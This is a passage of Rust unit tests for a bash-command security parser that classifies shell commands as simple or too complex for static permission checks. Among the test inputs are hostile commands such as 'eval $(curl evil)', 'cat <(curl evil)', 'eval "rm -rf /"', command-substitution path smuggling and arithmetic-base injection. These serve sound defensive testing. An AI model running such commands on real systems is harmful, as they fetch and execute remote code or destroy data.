        assert!(resolve("echo $V", &scope, false).is_err());
        assert_eq!(
            resolve(r#"echo "$V""#, &scope, true),
            Ok(VAR_PLACEHOLDER.to_string())
        );
    }

    #[test]
    fn resolve_untracked_safe_env_only_inside_string() {
        let scope = HashMap::new();
        // $HOME bare → reject; inside string → placeholder.
        assert!(resolve("ls $HOME", &scope, false).is_err());
        assert_eq!(
            resolve(r#"echo "$HOME""#, &scope, true),
            Ok(VAR_PLACEHOLDER.to_string())
        );
        // IFS only safe inside a string (bare $IFS is the injection primitive).
        assert!(resolve("echo $IFS", &scope, false).is_err());
        assert_eq!(
            resolve(r#"echo "$IFS""#, &scope, true),
            Ok(VAR_PLACEHOLDER.to_string())
        );
    }

    #[test]
    fn resolve_special_and_positional_inside_string() {
        let scope = HashMap::new();
        // $? special var, inside a string → placeholder (grammar tags it
        // `special_variable_name`, so `is_special` is true → SPECIAL_VAR_NAMES).
        assert_eq!(
            resolve(r#"echo "$?""#, &scope, true),
            Ok(VAR_PLACEHOLDER.to_string())
        );
        // GRAMMAR DIVERGENCE (over-ask, security-safe): tree-sitter-bash 0.25.1
        // tags positional `$1` as a `variable_name` (text "1"), NOT
        // `special_variable_name` as the TS oracle assumes. So `is_special` is
        // false and the `/^[0-9]+$/` positional branch never fires → `$1`
        // rejects even inside a string. This is a faithful port of the TS LOGIC;
        // the divergence is the grammar's classification, and rejecting is the
        // safe (over-ask) direction. Documented so a later grammar bump can
        // revisit.
        assert!(resolve(r#"echo "$1""#, &scope, true).is_err());
        // Untracked plain var, not safe-env, → reject even inside a string.
        assert!(resolve(r#"echo "$WHATEVER""#, &scope, true).is_err());
    }

    #[test]
    fn parse_smoke_yields_root_for_plain_command() {
        let tree = crate::bash_tree_sitter::parse_raw("ls -la").expect("parse succeeds");
        let root = tree.root_node();
        assert_eq!(root.kind(), "program");
        assert!(!root.has_error(), "plain command parses without ERROR");
        // The empty / over-length cases mirror parser.ts:59 → None.
        assert!(crate::bash_tree_sitter::parse_raw("").is_none());
    }

    #[test]
    fn empty_is_simple_empty() {
        assert_eq!(
            parse_for_security(""),
            ParseForSecurityResult::Simple { commands: vec![] }
        );
        // Whitespace-only trims to empty → simple.
        assert_eq!(
            parse_for_security("   "),
            ParseForSecurityResult::Simple { commands: vec![] }
        );
    }

    #[test]
    fn plain_command_extracts_simple() {
        // L3: an analyzable command is now extracted to Simple{commands}.
        match parse_for_security("ls -la") {
            ParseForSecurityResult::Simple { commands } => {
                assert_eq!(commands.len(), 1);
                assert_eq!(commands[0].argv, vec!["ls", "-la"]);
            }
            other => panic!("expected Simple, got {other:?}"),
        }
        assert_eq!(pre_check_too_complex("ls -la"), None);
        assert_eq!(pre_check_too_complex("git status"), None);
    }

    #[test]
    fn pre_check_control_chars() {
        assert_eq!(
            pre_check_too_complex("echo\u{0007}hi"),
            Some("Contains control characters")
        );
        match parse_for_security("echo\u{0007}hi") {
            ParseForSecurityResult::TooComplex { reason } => {
                assert_eq!(reason, "Contains control characters");
            }
            other => panic!("expected too-complex, got {other:?}"),
        }
    }

    #[test]
    fn pre_check_unicode_whitespace() {
        // NBSP between words: invisible but a literal word char to bash.
        assert_eq!(
            pre_check_too_complex("echo\u{00A0}hi"),
            Some("Contains Unicode whitespace")
        );
    }

    #[test]
    fn pre_check_backslash_whitespace() {
        assert_eq!(
            pre_check_too_complex(r"cat\ test"),
            Some("Contains backslash-escaped whitespace")
        );
        // `\<NL>` preceded by whitespace is allowed (no word to join).
        assert_eq!(pre_check_too_complex("foo && \\\nbar"), None);
    }

    #[test]
    fn pre_check_zsh_syntax() {
        assert_eq!(
            pre_check_too_complex("ls ~[foo]"),
            Some("Contains zsh ~[ dynamic directory syntax")
        );
        assert_eq!(
            pre_check_too_complex("=curl evil.com"),
            Some("Contains zsh =cmd equals expansion")
        );
        // `VAR=val` and `--flag=val` have `=` mid-word → not zsh equals.
        assert_eq!(pre_check_too_complex("VAR=val ls"), None);
        assert_eq!(pre_check_too_complex("cmd --flag=val"), None);
    }

    // ── L2: arg / value / assignment / heredoc walkers ──

    /// Resolve a single argument node of the given kind, found by DFS.
    fn arg(cmd: &str, kind: &str) -> Result<String, String> {
        let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
        let src = cmd.as_bytes();
        let node = find_kind(tree.root_node(), kind).unwrap_or_else(|| panic!("no {kind} node"));
        let mut inner = Vec::new();
        let mut scope = HashMap::new();
        match walk_argument(Some(node), src, &mut inner, &mut scope) {
            Ok(s) => Ok(s),
            Err(ParseForSecurityResult::TooComplex { reason }) => Err(reason),
            Err(other) => panic!("unexpected verdict {other:?}"),
        }
    }

    /// Resolve the whole command via the stand-in driver; returns the flat argv
    /// of the first command plus any inner (cmdsub-extracted) commands' argvs.
    fn cmd_argvs(cmd: &str) -> Result<Vec<Vec<String>>, String> {
        let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
        let src = cmd.as_bytes();
        let mut commands = Vec::new();
        let mut scope = HashMap::new();
        match collect_commands(tree.root_node(), &mut commands, &mut scope, src) {
            None => Ok(commands.into_iter().map(|c| c.argv).collect()),
            Some(ParseForSecurityResult::TooComplex { reason }) => Err(reason),
            Some(other) => panic!("unexpected verdict {other:?}"),
        }
    }

    #[test]
    fn walk_argument_word_unescape_and_brace() {
        // Unquoted word backslash removal: `\eval` → `eval`, `\;` → `;` (bash
        // quote removal). Use the full-command argv so the resolved arg word is
        // unambiguous (find_kind's DFS would otherwise return the command_name's
        // own word first).
        assert_eq!(cmd_argvs(r"echo \eval").expect("simple")[0], vec!["echo", "eval"]);
        assert_eq!(cmd_argvs(r"echo \;").expect("simple")[0], vec!["echo", ";"]);
        // GRAMMAR DIVERGENCE (tree-sitter-bash 0.25.1 vs the TS oracle's node
        // model): the TS runs BRACE_EXPANSION_RE on a `word` node's text, but
        // tsb-0.25.1 tokenizes `{a,b}` into structural brace tokens with an inner
        // `word` of text `"a,b"` (NO braces) — so `walk_argument`'s word-level
        // brace check never fires for a plain `{a,b}`. The check is retained
        // faithfully (it still fires for a word whose literal text contains
        // `{x,y}`, e.g. inside a concatenation), but plain brace expansion must be
        // rejected STRUCTURALLY in the L3 `collect_commands`/`walk_command` layer.
        // ⚠️ FOLLOW-UP (L3 + adversarial verify): confirm `{a,b}` as an argument is
        // rejected end-to-end (it is NOT caught by the pre-checks, which only flag
        // brace+quote). Tracked so the dead word-level path is not mistaken for
        // coverage.
        assert_eq!(arg("{a,b}", "word"), Ok("a,b".to_string()));
    }

    #[test]
    fn walk_argument_raw_string_and_number() {
        assert_eq!(arg("echo '/etc/passwd'", "raw_string"), Ok("/etc/passwd".to_string()));
        // Plain number → its text.
        assert_eq!(arg("sleep 10", "number"), Ok("10".to_string()));
        // `10#$(cmd)` arithmetic-base smuggling: number node WITH a child → reject.
        assert_eq!(
            arg("echo 10#$(id)", "number"),
            Err("Number node contains expansion (NN# arithmetic base syntax)".to_string())
        );
    }

    #[test]
    fn walk_argument_bare_cmdsub_is_too_complex() {
        // `rm $(echo /etc)` — bare command_substitution at arg position must
        // reject (the $() output IS the argument; placeholder would hide the path).
        assert_eq!(
            cmd_argvs("rm $(echo /etc)"),
            Err("Contains command_substitution".to_string())
        );
    }

    #[test]
    fn walk_string_solo_placeholder_rejects() {
        // `"$(cmd)"` alone → solo-placeholder → reject (guard A). The inner
        // command is still extracted before the guard fires; the verdict is the
        // too-complex on the outer string.
        assert_eq!(
            cmd_argvs(r#"cd "$(echo /etc)""#),
            Err("Unhandled node type: string".to_string())
        );
    }

    #[test]
    fn walk_string_literal_plus_cmdsub_extracts_inner() {
        // `echo "SHA: $(git rev-parse HEAD)"` — literal + placeholder is allowed;
        // the inner `git rev-parse HEAD` is extracted as a second command.
        let argvs = cmd_argvs(r#"echo "SHA: $(git rev-parse HEAD)""#).expect("simple");
        assert_eq!(argvs.len(), 2);
        // Inner commands accumulate FIRST (extracted during walkString, before the
        // outer command is pushed): ["git", "rev-parse", "HEAD"].
        assert_eq!(argvs[0], vec!["git", "rev-parse", "HEAD"]);
        // Outer: ["echo", "SHA: __CMDSUB_OUTPUT__"].
        assert_eq!(argvs[1][0], "echo");
        assert_eq!(argvs[1][1], format!("SHA: {CMDSUB_PLACEHOLDER}"));
    }

    #[test]
    fn walk_string_double_quote_escapes_and_newline_kept() {
        // Inside "...": `\"` → `"`, but `\n` (backslash-n) is NOT a real newline
        // here — tree-sitter keeps the literal `\n` two chars; our escape rule
        // only strips `\` before $ ` " \, so `\n` stays `\n`.
        let argvs = cmd_argvs(r#"echo "fix \"bug\"""#).expect("simple");
        assert_eq!(argvs[0][1], r#"fix "bug""#);
    }

    #[test]
    fn walk_string_whitespace_only_quirk_rejects() {
        // tree-sitter attributes a whitespace-only `" "` to the closing quote →
        // no content children. Guard B (text len > 2) → reject.
        assert_eq!(cmd_argvs(r#"echo " ""#), Err("Unhandled node type: string".to_string()));
        // Genuine empty `""` (len == 2) is fine → argv element "".
        let argvs = cmd_argvs(r#"echo """#).expect("simple");
        assert_eq!(argvs[0], vec!["echo".to_string(), String::new()]);
    }

    #[test]
    fn walk_arithmetic_literal_ok_variable_rejects() {
        // `$((1+2))` — literal arithmetic, argv gets the full span verbatim.
        let argvs = cmd_argvs("echo $((1+2))").expect("simple");
        assert_eq!(argvs[0][1], "$((1+2))");
        // `$((x))` references a variable → arithmetic injection → reject.
        let r = cmd_argvs("echo $((x))");
        assert!(
            matches!(&r, Err(reason) if reason.starts_with("Arithmetic expansion references variable or non-literal")),
            "got {r:?}"
        );
    }

    #[test]
    fn walk_variable_assignment_name_guards() {
        let tree = crate::bash_tree_sitter::parse_raw("IFS=x ls").expect("parse");
        let src = "IFS=x ls".as_bytes();
        let node = find_kind(tree.root_node(), "variable_assignment").expect("assignment");
        let mut inner = Vec::new();
        let mut scope = HashMap::new();
        match walk_variable_assignment(node, &mut inner, &mut scope, src) {
            Err(ParseForSecurityResult::TooComplex { reason }) => {
                assert_eq!(reason, "IFS assignment changes word-splitting — cannot model statically");
            }
            other => panic!("expected IFS reject, got {other:?}"),
        }
    }

    #[test]
    fn walk_variable_assignment_ps4_and_tilde() {
        fn assign(cmd: &str) -> Result<VarAssign, String> {
            let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
            let src = cmd.as_bytes();
            let node = find_kind(tree.root_node(), "variable_assignment").expect("assignment");
            let mut inner = Vec::new();
            let mut scope = HashMap::new();
            match walk_variable_assignment(node, &mut inner, &mut scope, src) {
                Ok(ev) => Ok(ev),
                Err(ParseForSecurityResult::TooComplex { reason }) => Err(reason),
                Err(o) => panic!("unexpected {o:?}"),
            }
        }
        // Plain literal assignment.
        assert_eq!(
            assign("VAR=safe ls"),
            Ok(VarAssign {
                name: "VAR".to_string(),
                value: "safe".to_string(),
                is_append: false
            })
        );
        // PS4 with cmdsub → reject (placeholder).
        assert_eq!(
            assign("PS4=$(id) ls"),
            Err("PS4 value derived from cmdsub/variable — runtime unknowable".to_string())
        );
        // PS4 legit charset passes (raw_string `${...}` refs + safe chars).
        assert!(assign(r#"PS4='+${BASH_SOURCE}:${LINENO}: ' ls"#).is_ok());
        // PS4 with a bare `$` (split primitive) is off the allowlist → reject.
        assert_eq!(
            assign(r#"PS4='$ ' ls"#),
            Err("PS4 value outside safe charset — only ${VAR} refs and [A-Za-z0-9 _+:.=/[]-] allowed".to_string())
        );
        // Tilde in value → reject.
        assert_eq!(
            assign("VAR=~/x ls"),
            Err("Tilde in assignment value — bash may expand at assignment time".to_string())
        );
    }

    #[test]
    fn walk_heredoc_redirect_quoting() {
        fn heredoc(cmd: &str) -> Option<String> {
            let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
            let src = cmd.as_bytes();
            let node = find_kind(tree.root_node(), "heredoc_redirect").expect("heredoc");
            match walk_heredoc_redirect(node, src) {
                None => None,
                Some(ParseForSecurityResult::TooComplex { reason }) => Some(reason),
                Some(o) => panic!("unexpected {o:?}"),
            }
        }
        // Quoted delimiter → ok.
        assert_eq!(heredoc("cat <<'EOF'\nx\nEOF"), None);
        // Unquoted delimiter undergoes expansion → reject.
        assert_eq!(
            heredoc("cat <<EOF\nx\nEOF"),
            Some("Heredoc with unquoted delimiter undergoes shell expansion".to_string())
        );
    }

    #[test]
    fn extract_safe_cat_heredoc_body_and_dangerous() {
        fn cat_h(cmd: &str) -> CatHeredoc {
            let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
            let src = cmd.as_bytes();
            let node = find_kind(tree.root_node(), "command_substitution").expect("cmdsub");
            extract_safe_cat_heredoc(node, src)
        }
        // Safe cat-heredoc → body returned.
        match cat_h(r#"echo "$(cat <<'EOF'
/etc/passwd
EOF
)""#)
        {
            CatHeredoc::Body(b) => assert!(b.contains("/etc/passwd")),
            o => panic!("expected body, got {o:?}"),
        }
        // jq system() in the body → DANGEROUS.
        assert_eq!(
            cat_h(r#"echo "$(cat <<'EOF'
system("id")
EOF
)""#),
            CatHeredoc::Dangerous
        );
    }

    #[test]
    fn walk_string_safe_cat_heredoc_body_appended() {
        // Single-line safe cat-heredoc body must land in argv (so path validation
        // sees the real target), not be dropped.
        let argvs = cmd_argvs(
            r#"rm "$(cat <<'EOF'
/etc/passwd
EOF
)""#,
        )
        .expect("simple");
        // Outer rm argv element is the body (no inner command — cat-heredoc is a
        // static result, not recursed).
        assert_eq!(argvs[0][0], "rm");
        assert_eq!(argvs[0][1], "/etc/passwd");
    }

    #[test]
    fn pre_check_brace_with_quote_and_masking() {
        // Obfuscated brace expansion with a quote → flagged.
        assert_eq!(
            pre_check_too_complex("echo {a'}',b}"),
            Some("Contains brace with quote character (expansion obfuscation)")
        );
        // Quoted JSON payload: the `{` is inside quotes → masked → NOT flagged.
        assert_eq!(pre_check_too_complex(r#"curl -d '{"k":"v"}'"#), None);
        assert_eq!(pre_check_too_complex(r#"curl -d "{\"k\":\"v\"}""#), None);
    }

    // ── L3: walk_command / walk_redirected_statement / walk_file_redirect /
    //        collect_commands / walk_program / parse_for_security ──

    /// Run the full `parse_for_security` pipeline. `Ok(commands)` on Simple;
    /// `Err(reason)` on TooComplex; panic on ParseUnavailable (none of the L3
    /// inputs trip that).
    fn pfs(cmd: &str) -> Result<Vec<SimpleCommand>, String> {
        match parse_for_security(cmd) {
            ParseForSecurityResult::Simple { commands } => Ok(commands),
            ParseForSecurityResult::TooComplex { reason } => Err(reason),
            ParseForSecurityResult::ParseUnavailable => {
                panic!("unexpected ParseUnavailable for {cmd:?}")
            }
        }
    }

    /// Convenience: just the argv vectors.
    fn pfs_argvs(cmd: &str) -> Result<Vec<Vec<String>>, String> {
        pfs(cmd).map(|cs| cs.into_iter().map(|c| c.argv).collect())
    }

    #[test]
    fn l3_simple_command_argv_env_redirect() {
        // Plain command.
        let cs = pfs("git status").expect("simple");
        assert_eq!(cs.len(), 1);
        assert_eq!(cs[0].argv, vec!["git", "status"]);
        assert!(cs[0].env_vars.is_empty());
        assert!(cs[0].redirects.is_empty());
        assert_eq!(cs[0].text, "git status");

        // Env prefix → env_vars, NOT a tracked var (command-local).
        let cs = pfs("FOO=bar ls -l").expect("simple");
        assert_eq!(cs[0].argv, vec!["ls", "-l"]);
        assert_eq!(cs[0].env_vars, vec![("FOO".to_string(), "bar".to_string())]);

        // File redirect on the last command.
        let cs = pfs("echo hi > /tmp/out").expect("simple");
        assert_eq!(cs[0].argv, vec!["echo", "hi"]);
        assert_eq!(cs[0].redirects.len(), 1);
        assert_eq!(cs[0].redirects[0].op, ">");
        assert_eq!(cs[0].redirects[0].target, "/tmp/out");

        // fd-prefixed redirect.
        let cs = pfs("ls 2> /tmp/err").expect("simple");
        assert_eq!(cs[0].redirects[0].op, ">");
        assert_eq!(cs[0].redirects[0].fd, Some(2));
    }

    #[test]
    fn l3_pipeline_extracts_each_stage() {
        let argvs = pfs_argvs("ls -la | grep foo").expect("simple");
        assert_eq!(argvs.len(), 2);
        assert_eq!(argvs[0], vec!["ls", "-la"]);
        assert_eq!(argvs[1], vec!["grep", "foo"]);
    }

    #[test]
    fn l3_list_and_separators() {
        // `&&` carries scope linearly: VAR=push then `git $SUB` resolves.
        let argvs = pfs_argvs("VAR=safe && echo $VAR").expect("simple");
        // VAR=safe is a bare assignment (no command pushed), echo resolves $VAR.
        assert_eq!(argvs.len(), 1);
        assert_eq!(argvs[0], vec!["echo", "safe"]);
    }

    #[test]
    fn l3_flag_omission_attack_rejected() {
        // SECURITY: `true || FLAG=x && cmd $FLAG` — the `||` RHS may not run, so
        // FLAG is NOT carried across the `||`. `$FLAG` then resolves against the
        // post-`||` snapshot (FLAG unset) → bare $FLAG → too-complex (over-ask).
        let r = pfs("true || FLAG=--dry-run && rm $FLAG");
        assert!(r.is_err(), "flag-omission must not be Simple: {r:?}");
    }

    #[test]
    fn l3_subshell_extracts_inner() {
        let argvs = pfs_argvs("(cd /tmp && ls)").expect("simple");
        assert_eq!(argvs.len(), 2);
        assert_eq!(argvs[0], vec!["cd", "/tmp"]);
        assert_eq!(argvs[1], vec!["ls"]);
    }

    #[test]
    fn l3_command_substitution_in_string_extracts_inner() {
        // Inner extracted first, then outer with placeholder.
        let argvs = pfs_argvs(r#"echo "rev: $(git rev-parse HEAD)""#).expect("simple");
        assert_eq!(argvs.len(), 2);
        assert_eq!(argvs[0], vec!["git", "rev-parse", "HEAD"]);
        assert_eq!(argvs[1][0], "echo");
    }

    #[test]
    fn l3_bare_cmdsub_arg_rejected() {
        // `$()` output IS the argument → must reject (placeholder would hide path).
        assert_eq!(
            pfs("rm $(echo /etc)"),
            Err("Contains command_substitution".to_string())
        );
    }

    #[test]
    fn l3_process_substitution_rejected() {
        // process_substitution is in DANGEROUS_TYPES → "Contains process_substitution".
        assert_eq!(
            pfs("diff <(ls) <(ls)"),
            Err("Contains process_substitution".to_string())
        );
    }

    #[test]
    fn l3_brace_expansion_rejected_structurally() {
        // ⚠️ GRAMMAR DIVERGENCE: tsb-0.25.1 tokenizes `{a,b}` into a
        // `concatenation` whose text is `{a,b}` — the word-level check is dead, so
        // this is caught by walk_argument's concatenation brace check.
        assert_eq!(
            pfs("echo {a,b}"),
            Err("Brace expansion".to_string())
        );
        // `{a..c}` range form.
        assert_eq!(
            pfs("echo {a..c}"),
            Err("Brace expansion".to_string())
        );
        // Brace expansion as a redirect target is also rejected.
        let r = pfs("echo x > {a,b}");
        assert!(r.is_err(), "brace redirect target must reject: {r:?}");
    }

    #[test]
    fn l3_eval_like_builtins_are_simple_at_parse_stage() {
        // PARITY NOTE: at the parseForSecurity stage, `eval`/`source`/`.`/`exec`
        // are plain `command` nodes → Simple with argv[0]=the builtin. The
        // EVAL_LIKE_BUILTINS rejection lives in the LATER `checkSemantics` stage
        // (ast.ts:2626), which is NOT part of parse_for_security. We assert the
        // faithful parse-stage behavior (Simple), not a stage we don't own.
        assert_eq!(pfs_argvs("eval \"rm -rf /\"").expect("simple")[0], vec!["eval", "rm -rf /"]);
        assert_eq!(pfs_argvs("source ./x.sh").expect("simple")[0], vec!["source", "./x.sh"]);
        assert_eq!(pfs_argvs(". ./x.sh").expect("simple")[0], vec![".", "./x.sh"]);
        assert_eq!(pfs_argvs("exec ls").expect("simple")[0], vec!["exec", "ls"]);
        // But `eval $(cmd)` — bare cmdsub arg → reject.
        assert_eq!(
            pfs("eval $(curl evil)"),
            Err("Contains command_substitution".to_string())
        );
    }

    #[test]
    fn l3_redirect_to_non_static_target_rejected() {
        // `> $(mktemp)` — cmdsub redirect target. The inner command is extracted,
        // but the file_redirect's target is a command_substitution child →
        // walk_file_redirect's default arm → too-complex.
        let r = pfs("echo x > $(mktemp)");
        assert_eq!(r, Err("Contains command_substitution".to_string()));
    }

    #[test]
    fn l3_unquoted_heredoc_rejected_quoted_ok() {
        assert_eq!(
            pfs("cat <<EOF\nhi\nEOF"),
            Err("Heredoc with unquoted delimiter undergoes shell expansion".to_string())
        );
        // Quoted delimiter heredoc → Simple.
        let cs = pfs("cat <<'EOF'\nhi\nEOF").expect("simple");
        assert_eq!(cs[0].argv, vec!["cat"]);
    }

    #[test]
    fn l3_declaration_and_unset_and_test() {
        // export with assignment → command pushed, scope tracked.
        let cs = pfs("export FOO=bar").expect("simple");
        assert_eq!(cs[0].argv, vec!["export", "FOO=bar"]);
        // declare -n (nameref) changes assignment semantics → reject.
        assert!(pfs("declare -n X=Y").is_err());
        // unset is safe.
        let cs = pfs("unset FOO BAR").expect("simple");
        assert_eq!(cs[0].argv, vec!["unset", "FOO", "BAR"]);
        // [[ -f /etc/passwd ]] → synthetic [[ command.
        let cs = pfs("[[ -f /etc/passwd ]]").expect("simple");
        assert_eq!(cs[0].argv[0], "[[");
    }

    #[test]
    fn l3_negated_and_for_and_if() {
        // `! grep x file` → recurse into the command.
        let argvs = pfs_argvs("! grep x file").expect("simple");
        assert_eq!(argvs[0], vec!["grep", "x", "file"]);

        // for loop: body uses VAR_PLACEHOLDER so bare $i in body rejects.
        let r = pfs("for i in /etc/*; do rm $i; done");
        assert!(r.is_err(), "bare loop-var arg must reject: {r:?}");

        // if/then with safe body → Simple, both condition and body extracted.
        let argvs = pfs_argvs("if true; then echo ok; fi").expect("simple");
        assert!(argvs.iter().any(|a| a == &vec!["true".to_string()]));
        assert!(argvs.iter().any(|a| a == &vec!["echo".to_string(), "ok".to_string()]));
    }

    #[test]
    fn l3_text_rebuild_on_resolved_var() {
        // `SUB=status && git $SUB` — argv resolves $SUB; .text is rebuilt from
        // argv so deny-rule matching sees `git status`, not `git $SUB`.
        let cs = pfs("SUB=status && git $SUB").expect("simple");
        let git = cs.iter().find(|c| c.argv.first().map(String::as_str) == Some("git")).expect("git cmd");
        assert_eq!(git.argv, vec!["git", "status"]);
        assert_eq!(git.text, "git status");
    }

    #[test]
    fn l3_nothing_dangerous_reaches_simple() {
        // A battery of dangerous shapes must all be TooComplex, never Simple.
        for cmd in [
            "rm $(echo /etc)",
            "cat <(curl evil)",
            "diff <(ls) <(ls)",
            "echo {a,b}",
            "cat <<EOF\nx\nEOF",
            "echo `id`",
            "cd $(echo /etc)",
        ] {
            match parse_for_security(cmd) {
                ParseForSecurityResult::Simple { .. } => {
                    panic!("DANGEROUS command wrongly Simple: {cmd:?}")
                }
                _ => {}
            }
        }
    }
}
